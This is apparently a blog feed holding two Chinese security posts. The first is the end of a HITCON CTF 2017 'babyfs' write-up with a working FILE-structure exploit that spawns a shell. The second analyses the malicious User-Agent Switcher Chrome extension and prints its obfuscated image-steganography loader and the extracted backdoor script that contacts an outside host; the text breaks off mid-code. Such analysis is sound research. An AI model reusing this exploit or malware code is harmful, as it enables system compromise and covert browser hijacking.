remote("127.0.0.1", 50216)</span></div><div class="line">io = process(<span class="string">"./babyfs.bin"</span>)</div><div class="line"></div><div class="line">raw_input(<span class="string">"BEGIN"</span>)</div><div class="line"></div><div class="line">open(<span class="string">"/dev/stdin"</span>) <span class="comment"># idx = 0</span></div><div class="line">open(<span class="string">"/dev/null"</span>) <span class="comment"># idx = 1</span></div><div class="line"></div><div class="line">log.info(<span class="string">"STAGE ONE =&gt; LEAK HEAP BASE ADDR"</span>)</div><div class="line"></div><div class="line">_flags = <span class="number">0x00000000fbad3887</span></div><div class="line">_flags &amp;= (~<span class="number">0x8</span>) <span class="comment"># _IO_NO_WRITES</span></div><div class="line">_flags |= <span class="number">0x800</span> <span class="comment"># _IO_CURRENTLY_PUTTING</span></div><div class="line"></div><div class="line">log.success(hex(_flags))</div><div class="line"></div><div class="line">payload  = <span class="string">"A"</span> * <span class="number">24</span></div><div class="line">payload += p64(<span class="number">0x231</span>)</div><div class="line">payload += p64(_flags) <span class="comment"># _IO_MAGIC</span></div><div class="line">payload += p64(<span class="number">0x0</span>) * <span class="number">13</span></div><div class="line">payload += p64(<span class="number">0x2</span>)</div><div class="line"></div><div class="line">read(<span class="number">0</span>, len(payload))</div><div class="line">io.sendline(payload)</div><div class="line"></div><div class="line">read(<span class="number">1</span>, <span class="number">0</span>) <span class="comment"># fix file stream buffer ptr</span></div><div class="line"></div><div class="line">payload  = <span class="string">"A"</span> * <span class="number">23</span> <span class="comment"># skip 1 byte for '\n'</span></div><div class="line">payload += p64(<span class="number">0x231</span>)</div><div class="line">payload += p64(_flags)</div><div class="line">payload += p64(<span class="number">0x0</span>) * <span class="number">3</span></div><div class="line">payload += p8(<span class="number">0x0</span>)</div><div class="line"></div><div class="line">read(<span class="number">0</span>, len(payload)) <span class="comment"># overwrite write_buffer_ptr (partial)</span></div><div class="line">io.sendline(payload)</div><div class="line">close(<span class="number">1</span>)</div><div class="line">io.recvuntil(<span class="string">"\xad\xfb"</span>) <span class="comment"># _IO_MAGIC</span></div><div class="line">io.recv(<span class="number">36</span>)</div><div class="line">ret = io.recv(<span class="number">8</span>)</div><div class="line">heap_base = (u64(ret) &amp; <span class="number">0xffffffffffffff000</span>) - <span class="number">0x1000</span></div><div class="line"></div><div class="line"><span class="comment">#close(0)</span></div><div class="line"></div><div class="line">log.success(<span class="string">"[HEAP BASE ADDR] =&gt; &#123;&#125;"</span>.format(hex(heap_base)))</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#open("/dev/stdin") # idx = 0</span></div><div class="line">open(<span class="string">"/dev/null"</span>)</div><div class="line"></div><div class="line">payload  = <span class="string">"A"</span> * <span class="number">22</span></div><div class="line">payload += p64(<span class="number">0x231</span>)</div><div class="line">payload += p64(_flags) <span class="comment"># _IO_MAGIC</span></div><div class="line">payload += p64(<span class="number">0x0</span>) * <span class="number">13</span></div><div class="line">payload += p64(<span class="number">0x1</span>)</div><div class="line"></div><div class="line">read(<span class="number">0</span>, len(payload))</div><div class="line">io.sendline(payload)</div><div class="line"></div><div class="line">read(<span class="number">1</span>, <span class="number">0</span>) <span class="comment"># fix file stream buffer ptr</span></div><div class="line"></div><div class="line">payload  = <span class="string">"A"</span> * <span class="number">21</span></div><div class="line">payload += p64(<span class="number">0x231</span>)</div><div class="line">payload += p64(_flags) <span class="comment"># _IO_MAGIC</span></div><div class="line">payload += p64(<span class="number">0x0</span>) * <span class="number">3</span></div><div class="line">payload += p64(heap_base + <span class="number">0x1000</span> + <span class="number">0x348</span>)</div><div class="line">payload += p64(heap_base + <span class="number">0x1000</span> + <span class="number">0x350</span>)</div><div class="line">payload += p64(heap_base + <span class="number">0x1000</span> + <span class="number">0x350</span>)</div><div class="line"></div><div class="line">read(<span class="number">0</span>, len(payload)+<span class="number">1</span>)</div><div class="line">io.sendline(payload)</div><div class="line"></div><div class="line">close(<span class="number">1</span>)</div><div class="line"></div><div class="line">io.recvline()</div><div class="line">ret = io.recv(<span class="number">8</span>)</div><div class="line">libc_base = u64(ret) - libc_offset</div><div class="line">log.success(<span class="string">"[LIBC BASE ADDR] =&gt; &#123;&#125;"</span>.format(hex(libc_base)))</div><div class="line"></div><div class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># stage 3</span></div><div class="line"></div><div class="line">blind_open(<span class="string">"/dev/stdin"</span>)</div><div class="line">blind_close(<span class="number">0</span>)</div><div class="line">blind_open(<span class="string">"/dev/stdin"</span>)</div><div class="line"></div><div class="line">_flags = <span class="number">0xfbad208b</span></div><div class="line"></div><div class="line">payload  = <span class="string">"/bin/sh\x00"</span>.ljust(<span class="number">24</span>, <span class="string">"\x00"</span>)</div><div class="line">payload += p64(<span class="number">0x231</span>)</div><div class="line">payload += p64(_flags)</div><div class="line">payload += p64(<span class="number">0</span>) * <span class="number">6</span></div><div class="line">payload += p64(free_hook)</div><div class="line">payload += p64(free_hook + <span class="number">0x20</span>) <span class="comment"># fix buff_end</span></div><div class="line">payload += p8(<span class="number">0</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">blind_read(<span class="number">0</span>, len(payload))</div><div class="line">sleep(<span class="number">2</span>)</div><div class="line">io.sendline(payload)</div><div class="line"></div><div class="line">blind_read(<span class="number">1</span>, <span class="number">8</span>)</div><div class="line">sleep(<span class="number">1</span>)</div><div class="line"></div><div class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</div><div class="line"></div><div class="line">io.sendline(p64(system_addr))</div><div class="line"></div><div class="line">blind_close(<span class="number">0</span>)</div><div class="line"></div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;HITCON-CTF-2017-QUAL&quot;&gt;&lt;a href=&quot;#HITCON-CTF-2017-QUAL&quot; class=&quot;headerlink&quot; title=&quot;HITCON CTF 2017 QUAL&quot;&gt;&lt;/a&gt;HITCON CTF 2017 QUAL&lt;/h2&gt;&lt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Chrome恶意插件User-Agent Switcher分析</title>
    <link href="http://weaponx.site/2017/10/15/Chrome%E6%81%B6%E6%84%8F%E6%8F%92%E4%BB%B6User-Agent-Switcher%E5%88%86%E6%9E%90/"/>
    <id>http://weaponx.site/2017/10/15/Chrome恶意插件User-Agent-Switcher分析/</id>
    <published>2017-10-16T02:28:00.000Z</published>
    <updated>2017-10-16T02:31:18.442Z</updated>
    
    <content type="html"><![CDATA[<p>之前写的，放出来-。-</p>
<h2 id="插件背景"><a href="#插件背景" class="headerlink" title="插件背景"></a>插件背景</h2><p>User-Agent Swither 是一款Chrome插件，用户切换访问web时候的User-Agent的，这个插件有51万条安装量。大部分都是前端工作人员或者安全研究人员使用，需要频繁切换User-Agent。</p>
<p>然而，在v2ex上有人发了这么一篇文章<code>https://www.v2ex.com/t/389340?from=timeline</code></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>通常，chrome插件的物理地址<code>C:\Users\admin\AppData\Local\Google\Chrome\User Data\Default\Extensions\ffhkkpnppgnfaobgihpdblnhmmbodake</code></p>
<p>打开<code>background.js</code>，看这个js文件的第80行</p>
<p><img src="1.png" alt=""></p>
<p>格式化后</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> promo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">var</span> t = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,</div><div class="line">        r = &#123;</div><div class="line">            <span class="attr">Ae</span>: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</div><div class="line">                <span class="keyword">if</span> (<span class="built_in">isNaN</span>(t) || !<span class="built_in">isFinite</span>(t) || t % <span class="number">1</span> || t &lt; <span class="number">2</span>) <span class="keyword">return</span> ! <span class="number">1</span>;</div><div class="line">                <span class="keyword">if</span> (t % <span class="number">2</span> === <span class="number">0</span>) <span class="keyword">return</span> <span class="number">2</span> === t;</div><div class="line">                <span class="keyword">if</span> (t % <span class="number">3</span> === <span class="number">0</span>) <span class="keyword">return</span> <span class="number">3</span> === t;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> r = <span class="built_in">Math</span>.sqrt(t), e = <span class="number">5</span>; e &lt;= r; e += <span class="number">6</span>) &#123;</div><div class="line">                    <span class="keyword">if</span> (t % e === <span class="number">0</span>) <span class="keyword">return</span> ! <span class="number">1</span>;</div><div class="line">                    <span class="keyword">if</span> (t % (e + <span class="number">2</span>) === <span class="number">0</span>) <span class="keyword">return</span> ! <span class="number">1</span></div><div class="line">                &#125;</div><div class="line">                <span class="keyword">return</span> ! <span class="number">0</span></div><div class="line">            &#125;,</div><div class="line">            <span class="attr">Hf</span>: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> r = <span class="string">""</span>,</div><div class="line">                e = <span class="number">-670</span>,</div><div class="line">                n = <span class="number">0</span>,</div><div class="line">                i = <span class="number">0</span>; i &lt; t.length; i++) n = t[i].charCodeAt() + e,</div><div class="line">                r += <span class="built_in">String</span>.fromCharCode(n);</div><div class="line">                <span class="keyword">return</span> r</div><div class="line">            &#125;,</div><div class="line">            <span class="attr">Yb</span>: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> e = t; ! <span class="number">0</span>; e += <span class="number">1</span>) <span class="keyword">if</span> (r.Ae(e)) <span class="keyword">return</span> e</div><div class="line">            &#125;,</div><div class="line">            <span class="attr">Wk</span>: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</div><div class="line">                <span class="keyword">var</span> r = <span class="keyword">new</span> Image;</div><div class="line">                <span class="keyword">for</span> (r.src = t; r.hasOwnProperty(<span class="string">"complete"</span>) &amp;&amp; !r.complete;);</div><div class="line">                <span class="keyword">return</span> r</div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line">        <span class="keyword">return</span> t.prototype.ET = &#123;</div><div class="line">            <span class="attr">mp</span>: <span class="number">3</span>,</div><div class="line">            <span class="attr">Tv</span>: <span class="number">1</span>,</div><div class="line">            <span class="attr">At</span>: <span class="number">16</span>,</div><div class="line">            <span class="attr">WC</span>: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</div><div class="line">                <span class="keyword">return</span> t + <span class="number">1</span></div><div class="line">            &#125;,</div><div class="line">            <span class="attr">TY</span>: <span class="function"><span class="keyword">function</span>(<span class="params">t, r, e</span>) </span>&#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> n = !<span class="number">0</span>,</div><div class="line">                i = <span class="number">0</span>; i &lt; <span class="number">16</span> &amp;&amp; n; i += <span class="number">1</span>) n = n &amp;&amp; <span class="number">255</span> === t[r + <span class="number">4</span> * i];</div><div class="line">                <span class="keyword">return</span> n</div><div class="line">            &#125;</div><div class="line">        &#125;,</div><div class="line">        t.prototype.aq = <span class="function"><span class="keyword">function</span>(<span class="params">t, r</span>) </span>&#123;</div><div class="line">            r = r || &#123;&#125;;</div><div class="line">            <span class="keyword">var</span> e = <span class="keyword">this</span>.ET,</div><div class="line">            n = r.width || t.width,</div><div class="line">            i = r.height || t.height,</div><div class="line">            o = r.mp || e.mp,</div><div class="line">            h = r.At || e.At;</div><div class="line">            <span class="keyword">return</span> o * n * i / h &gt;&gt; <span class="number">0</span></div><div class="line">        &#125;,</div><div class="line">        t.prototype.Vh = <span class="function"><span class="keyword">function</span>(<span class="params">t, e</span>) </span>&#123;</div><div class="line">            <span class="keyword">if</span> (<span class="string">""</span> === <span class="string">'../promo.jpg'</span>) <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">            <span class="keyword">void</span> <span class="number">0</span> === t &amp;&amp; (t = <span class="string">'../promo.jpg'</span>),</div><div class="line">            t.length &amp;&amp; (t = r.Wk(t)),</div><div class="line">            e = e || &#123;&#125;;</div><div class="line">            <span class="keyword">var</span> n = <span class="keyword">this</span>.ET,</div><div class="line">            i = e.mp || n.mp,</div><div class="line">            o = e.Tv || n.Tv,</div><div class="line">            h = e.At || n.At,</div><div class="line">            a = r.Yb(<span class="built_in">Math</span>.pow(<span class="number">2</span>, i)),</div><div class="line">            f = (e.WC || n.WC, e.TY || n.TY),</div><div class="line">            u = <span class="built_in">document</span>.createElement(<span class="string">"canvas"</span>),</div><div class="line">            p = u.getContext(<span class="string">"2d"</span>);</div><div class="line">            <span class="keyword">if</span> (u.style.display = <span class="string">"none"</span>, u.width = e.width || t.width, u.height = e.width || t.height, <span class="number">0</span> === u.width || <span class="number">0</span> === u.height) <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">            e.height &amp;&amp; e.width ? p.drawImage(t, <span class="number">0</span>, <span class="number">0</span>, e.width, e.height) : p.drawImage(t, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">            <span class="keyword">var</span> c = p.getImageData(<span class="number">0</span>, <span class="number">0</span>, u.width, u.height),</div><div class="line">            d = c.data,</div><div class="line">            g = [];</div><div class="line">            <span class="keyword">if</span> (c.data.every(<span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span> === t</div><div class="line">            &#125;)) <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">            <span class="keyword">var</span> m, s;</div><div class="line">            <span class="keyword">if</span> (<span class="number">1</span> === o) <span class="keyword">for</span> (m = <span class="number">3</span>, s = !<span class="number">1</span>; ! s &amp;&amp; m &lt; d.length &amp;&amp; !s; m += <span class="number">4</span>) s = f(d, m, o),</div><div class="line">            s || g.push(d[m] - (<span class="number">255</span> - a + <span class="number">1</span>));</div><div class="line">            <span class="keyword">var</span> v = <span class="string">""</span>,</div><div class="line">            w = <span class="number">0</span>,</div><div class="line">            y = <span class="number">0</span>,</div><div class="line">            l = <span class="built_in">Math</span>.pow(<span class="number">2</span>, h) - <span class="number">1</span>;</div><div class="line">            <span class="keyword">for</span> (m = <span class="number">0</span>; m &lt; g.length; m += <span class="number">1</span>) w += g[m] &lt;&lt; y,</div><div class="line">            y += i,</div><div class="line">            y &gt;= h &amp;&amp; (v += <span class="built_in">String</span>.fromCharCode(w &amp; l), y %= h, w = g[m] &gt;&gt; i - y);</div><div class="line">            <span class="keyword">return</span> v.length &lt; <span class="number">13</span> ? <span class="string">""</span>: (<span class="number">0</span> !== w &amp;&amp; (v += <span class="built_in">String</span>.fromCharCode(w &amp; l)), v)</div><div class="line">        &#125;,</div><div class="line">        t.prototype.Po = <span class="number">3</span>,</div><div class="line">        t.prototype.cs = <span class="number">0</span>,</div><div class="line">        t.prototype.Rn = <span class="number">5e3</span>,</div><div class="line">        t.prototype.dS = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="keyword">try</span> &#123;</div><div class="line">                <span class="keyword">var</span> e = t.prototype,</div><div class="line">                n = r.Hf(e.Vh());</div><div class="line">                <span class="keyword">if</span> (<span class="string">""</span> === n) &#123;</div><div class="line">                    <span class="keyword">if</span> (e.cs &gt; e.Po) <span class="keyword">return</span>;</div><div class="line">                    <span class="keyword">return</span> e.cs++,</div><div class="line">                    <span class="keyword">void</span> setTimeout(e.dS, e.Rn)</div><div class="line">                &#125;</div><div class="line">                <span class="built_in">document</span>.defaultView[(<span class="keyword">typeof</span> r.Ae).charAt(<span class="number">0</span>).toUpperCase() + (<span class="keyword">typeof</span> r.Ae).slice(<span class="number">1</span>)](n)()</div><div class="line">            &#125; <span class="keyword">catch</span>(t) &#123;&#125;</div><div class="line">        &#125;,</div><div class="line">        (<span class="keyword">new</span> t).dS</div><div class="line">    &#125; <span class="keyword">catch</span>(t) &#123;&#125;</div><div class="line">&#125; ();</div><div class="line">promo();</div></pre></td></tr></table></figure>
<p>可以看出，这段js从<code>promo.jpg</code>图片中取数据。下图为这段js代码解析出来的后门js代码。</p>
<p><img src="2.png" alt=""></p>
<p>跳转到从图片中解析出来的javascript代码</p>
<p><img src="3.png" alt=""></p>
<p>代码抠出来是这样的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> _0x2126=[<span class="string">'\x63\x6f\x64\x65'</span>,<span class="string">'\x76\x65\x72\x73\x69\x6f\x6e'</span>,<span class="string">'\x65\x72\x72\x6f\x72'</span>,<span class="string">'\x64\x6f\x77\x6e\x6c\x6f\x61\x64'</span>,<span class="string">'\x69\x6e\x76\x61\x6c\x69\x64\x4d\x6f\x6e\x65\x74\x69\x7a\x61\x74\x69\x6f\x6e\x43\x6f\x64\x65'</span>,<span class="string">'\x54\x6a\x50\x7a\x6c\x38\x63\x61\x49\x34\x31'</span>,<span class="string">'\x4b\x49\x31\x30\x77\x54\x77\x77\x76\x46\x37'</span>,<span class="string">'\x46\x75\x6e\x63\x74\x69\x6f\x6e'</span>,<span class="string">'\x72\x75\x6e'</span>,<span class="string">'\x69\x64\x6c\x65'</span>,<span class="string">'\x70\x79\x57\x35\x46\x31\x55\x34\x33\x56\x49'</span>,<span class="string">'\x69\x6e\x69\x74'</span>,<span class="string">'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x68\x65\x2d\x65\x78\x74\x65\x6e\x73\x69\x6f\x6e\x2e\x63\x6f\x6d'</span>,<span class="string">'\x6c\x6f\x63\x61\x6c'</span>,<span class="string">'\x73\x74\x6f\x72\x61\x67\x65'</span>,<span class="string">'\x65\x76\x61\x6c'</span>,<span class="string">'\x74\x68\x65\x6e'</span>,<span class="string">'\x67\x65\x74'</span>,<span class="string">'\x67\x65\x74\x54\x69\x6d\x65'</span>,<span class="string">'\x73\x65\x74\x55\x54\x43\x48\x6f\x75\x72\x73'</span>,<span class="string">'\x75\x72\x6c'</span>,<span class="string">'\x6f\x72\x69\x67\x69\x6e'</span>,<span class="string">'\x73\x65\x74'</span>,<span class="string">'\x47\x45\x54'</span>,<span class="string">'\x6c\x6f\x61\x64\x69\x6e\x67'</span>,<span class="string">'\x73\x74\x61\x74\x75\x73'</span>,<span class="string">'\x72\x65\x6d\x6f\x76\x65\x4c\x69\x73\x74\x65\x6e\x65\x72'</span>,<span class="string">'\x6f\x6e\x55\x70\x64\x61\x74\x65\x64'</span>,<span class="string">'\x74\x61\x62\x73'</span>,<span class="string">'\x63\x61\x6c\x6c\x65\x65'</span>,<span class="string">'\x61\x64\x64\x4c\x69\x73\x74\x65\x6e\x65\x72'</span>,<span class="string">'\x6f\x6e\x4d\x65\x73\x73\x61\x67\x65'</span>,<span class="string">'\x72\x75\x6e\x74\x69\x6d\x65'</span>,<span class="string">'\x65\x78\x65\x63\x75\x74\x65\x53\x63\x72\x69\x70\x74'</span>,<span class="string">'\x72\x65\x70\x6c\x61\x63\x65'</span>,<span class="string">'\x64\x61\x74\x61'</span>,<span class="string">'\x74\x65\x73\x74'</span>,<span class="string">'\x69\x6e\x63\x6c\x75\x64\x65\x73'</span>,<span class="string">'\x68\x74\x74\x70\x3a\x2f\x2f'</span>,<span class="string">'\x6c\x65\x6e\x67\x74\x68'</span>,<span class="string">'\x55\x72\x6c\x20\x65\x72\x72\x6f\x72'</span>,<span class="string">'\x71\x75\x65\x72\x79'</span>,<span class="string">'\x66\x69\x6c\x74\x65\x72'</span>,<span class="string">'\x61\x63\x74\x69\x76\x65'</span>,<span class="string">'\x66\x6c\x6f\x6f\x72'</span>,<span class="string">'\x72\x61\x6e\x64\x6f\x6d'</span>,<span class="string">'\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'</span>,<span class="string">'\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'</span>,<span class="string">'\x70\x61\x72\x73\x65'</span>];<span class="function">(<span class="params"><span class="keyword">function</span>(_0x6f8364,_0x4b9bae</span>)&#123;<span class="params">var</span> <span class="params">_0x3c53a7</span>=<span class="params">function</span>(<span class="params">_0x221aea</span>)&#123;<span class="params">while</span>(<span class="params">--_0x221aea</span>)&#123;<span class="params">_0x6f8364</span>['\<span class="params">x70</span>\<span class="params">x75</span>\<span class="params">x73</span>\<span class="params">x68</span>'](<span class="params">_0x6f8364[<span class="string">'\x73\x68\x69\x66\x74'</span>](</span>));&#125;&#125;;<span class="params">_0x3c53a7</span>(<span class="params">++_0x4b9bae</span>);&#125;(<span class="params">_0x2126,<span class="number">0xa2</span></span>));<span class="params">var</span> <span class="params">_0x1838</span>=<span class="params">function</span>(<span class="params">_0x63fdaa,_0x4b2cbf</span>)&#123;<span class="params">var</span> <span class="params">_0x63fdaa</span>=<span class="params">parseInt</span>(<span class="params">_0x63fdaa,<span class="number">0x10</span></span>);<span class="params">var</span> <span class="params">_0x5570e3</span>=<span class="params">_0x2126</span>[<span class="params">_0x63fdaa</span>];<span class="params">return</span> <span class="params">_0x5570e3</span>;&#125;;<span class="params">function</span> <span class="params">e</span>(<span class="params">&#123;cat=_0x1838(<span class="string">'0x0'</span></span>),<span class="params">act</span>='',<span class="params">lab</span>='',<span class="params">fr</span>=0<span class="params">x3e8</span>*0<span class="params">x3c</span>*0<span class="params">x3c</span>*0<span class="params">x18</span>&#125;)&#123;<span class="params">let</span> <span class="params">_0x4b1721</span>=<span class="params">t</span>(<span class="params"><span class="string">`<span class="subst">$&#123;cat&#125;</span>_<span class="subst">$&#123;act&#125;</span>`</span>,c[<span class="string">'\x46\x44'</span>]</span>);<span class="params">return</span> <span class="params">l</span>['\<span class="params">x67</span>\<span class="params">x65</span>\<span class="params">x74</span>'](<span class="params">_0x4b1721</span>)[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x1'</span></span>)](<span class="params">_0x9415ed=&gt;&#123;<span class="keyword">let</span> _0x5d937f=_0x9415ed[_0x4b1721],_0x45c15f=<span class="number">0x5265c00</span>==fr?<span class="keyword">new</span> <span class="built_in">Date</span>(</span>)[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x3'</span></span>)]<span class="params">()</span>-<span class="params">new</span> <span class="params">Date</span>(<span class="params">_0x5d937f</span>)[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x4'</span></span>)](<span class="params"><span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span></span>)&gt;=<span class="params">fr</span>:<span class="params">new</span> <span class="params">Date</span><span class="params">()</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x3'</span></span>)]<span class="params">()</span>-<span class="params">_0x5d937f</span>&gt;=<span class="params">fr</span>;<span class="params">if</span>(<span class="params">!_0x5d937f||_0x45c15f</span>)&#123;<span class="params">let</span> <span class="params">_0x9415ed</span>=`<span class="params">$</span>&#123;<span class="params">new</span> <span class="params">URL</span>(<span class="params">c[<span class="string">'\x57\x4c'</span>][_0x1838(<span class="string">'0x5'</span></span>)])[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x6'</span></span>)]&#125;/<span class="params">stats</span>`;<span class="params">n</span>(<span class="params"><span class="string">`<span class="subst">$&#123;_0x9415ed&#125;</span>?hash=jwtmv6kavksy5cazdf4leg66r&amp;eventCategory=<span class="subst">$&#123;cat&#125;</span>&amp;eventAction=<span class="subst">$&#123;act&#125;</span>&amp;eventLabel=<span class="subst">$&#123;lab&#125;</span>`</span>,<span class="string">'\x50\x4f\x53\x54'</span></span>)['\<span class="params">x74</span>\<span class="params">x68</span>\<span class="params">x65</span>\<span class="params">x6e</span>'](<span class="params">_0x201de8=&gt;&#123;<span class="keyword">let</span> _0x9415ed=&#123;&#125;;_0x9415ed[_0x4b1721]=<span class="keyword">new</span> <span class="built_in">Date</span>(</span>)[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x3'</span></span>)]<span class="params">()</span>,<span class="params">l</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x7'</span></span>)](<span class="params">_0x9415ed</span>);&#125;);&#125;&#125;);&#125;<span class="params">function</span> <span class="params">n</span>(<span class="params">_0x42ba8f,n=_0x1838(<span class="string">'0x8'</span></span>))&#123;<span class="params">return</span> <span class="params">new</span> <span class="params">Promise</span>(<span class="params">(_0x3090bd,_0x473358</span>)=&gt;</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">_0x3ad6d4</span>(<span class="params">_0x3a3304,_0x4cce31,_0x57e5fb</span>)</span>&#123;_0x1838(<span class="string">'0x9'</span>)===_0x4cce31[_0x1838(<span class="string">'0xa'</span>)]&amp;&amp;<span class="function">(<span class="params">_0x20f3c8(_0x57e5fb,_0x42ba8f</span>)&amp;&amp;<span class="params">c</span>['\<span class="params">x4e</span>\<span class="params">x5a</span>']&lt;=0<span class="params">x0</span>&amp;&amp;(<span class="params">chrome[_0x1838(<span class="string">'0xd'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0xc'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0xb'</span></span>)](<span class="params"><span class="built_in">arguments</span>[_0x1838(<span class="string">'0xe'</span></span>)]),<span class="params">_0x2bc9ef</span>(<span class="params">_0x3a3304</span>)),<span class="params">c</span>['\<span class="params">x4e</span>\<span class="params">x5a</span>']--);&#125;<span class="params">function</span> <span class="params">_0x2bc9ef</span>(<span class="params">_0x5a3411</span>)&#123;<span class="params">chrome</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x11'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x10'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0xf'</span></span>)](<span class="params">_0x4b297c</span>),<span class="params">chrome</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0xd'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x12'</span></span>)](<span class="params">_0x5a3411,&#123;<span class="string">'\x63\x6f\x64\x65'</span>:<span class="string">`(function()&#123;var url = replaceableurl; var xhr = new XMLHttpRequest();xhr.onreadystatechange = function () &#123;if (xhr.readyState === 4) &#123;chrome.runtime.sendMessage(&#123;data: xhr.responseText, url: url,status:xhr.status&#125;);&#125;&#125;;xhr.open('<span class="subst">$&#123;n&#125;</span>',url, true);xhr.send();&#125;)()`</span>[_0x1838(<span class="string">'0x13'</span></span>)](<span class="params"><span class="string">'\x72\x65\x70\x6c\x61\x63\x65\x61\x62\x6c\x65\x75\x72\x6c'</span>,<span class="string">`'<span class="subst">$&#123;_0x42ba8f&#125;</span>'`</span></span>)&#125;);&#125;<span class="params">function</span> <span class="params">_0x4b297c</span>(<span class="params">_0x4a051f</span>)&#123;<span class="params">_0x4a051f</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x5'</span></span>)]===<span class="params">_0x42ba8f</span>&amp;&amp;(<span class="params">_0x3090bd(_0x4a051f[_0x1838(<span class="string">'0x14'</span></span>)]),<span class="params">chrome</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x11'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x10'</span></span>)]['\<span class="params">x72</span>\<span class="params">x65</span>\<span class="params">x6d</span>\<span class="params">x6f</span>\<span class="params">x76</span>\<span class="params">x65</span>\<span class="params">x4c</span>\<span class="params">x69</span>\<span class="params">x73</span>\<span class="params">x74</span>\<span class="params">x65</span>\<span class="params">x6e</span>\<span class="params">x65</span>\<span class="params">x72</span>'](<span class="params"><span class="built_in">arguments</span>[_0x1838(<span class="string">'0xe'</span></span>)]));&#125;<span class="params">function</span> <span class="params">_0x20f3c8</span>(<span class="params">_0x45a021,_0x3db6fb</span>)&#123;<span class="params">return</span> <span class="params">new</span> <span class="params">RegExp</span>(<span class="params"><span class="string">`^((?!(chrome<span class="subst">$&#123;_0x3db6fb[_0x1838(<span class="string">'0x16'</span>)](_0x1838(<span class="string">'0x17'</span>))?<span class="string">'\x7c\x68\x74\x74\x70\x73\x7c\x66\x74\x70\x73'</span>:<span class="string">''</span>&#125;</span>)).+://)`</span></span>)[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x15'</span></span>)](<span class="params">_0x45a021[_0x1838(<span class="string">'0x5'</span></span>)]);&#125;<span class="params">_0x42ba8f</span>&amp;&amp;0<span class="params">x0</span>!==<span class="params">_0x42ba8f</span>['\<span class="params">x6c</span>\<span class="params">x65</span>\<span class="params">x6e</span>\<span class="params">x67</span>\<span class="params">x74</span>\<span class="params">x68</span>']||<span class="params">_0x473358</span>(<span class="params">_0x1838(<span class="string">'0x19'</span></span>)),<span class="params">chrome</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0xd'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x1a'</span></span>)](<span class="params">&#123;&#125;,<span class="keyword">function</span>(_0x26d445</span>)&#123;<span class="params">let</span> <span class="params">_0x3090bd</span>=<span class="params">_0x26d445</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x1b'</span></span>)](<span class="params">_0x1c9951=&gt;_0x20f3c8(_0x1c9951,_0x42ba8f</span>)&amp;&amp;!<span class="params">_0x1c9951</span>['\<span class="params">x61</span>\<span class="params">x63</span>\<span class="params">x74</span>\<span class="params">x69</span>\<span class="params">x76</span>\<span class="params">x65</span>']);0<span class="params">x0</span>===<span class="params">_0x3090bd</span>[<span class="params">_0x1838</span>(<span class="params"><span 